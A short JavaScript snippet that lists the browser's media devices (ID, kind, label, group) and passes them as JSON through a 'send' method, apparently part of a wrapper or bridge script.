var $_$self = this;
navigator.mediaDevices.enumerateDevices().then(function(devices){
	var devs = [];
	for(var i=0; i<devices.length; i++){
		var device = devices[i];
		devs.push({
			deviceId: device.deviceId,
			kind: device.kind,
			label: device.label,
			groupId: device.groupId
		});
	}
	$_$self.send(JSON.stringify(devs));
})
.catch(function(e){
	$_$self.send('enumerate devices error');
});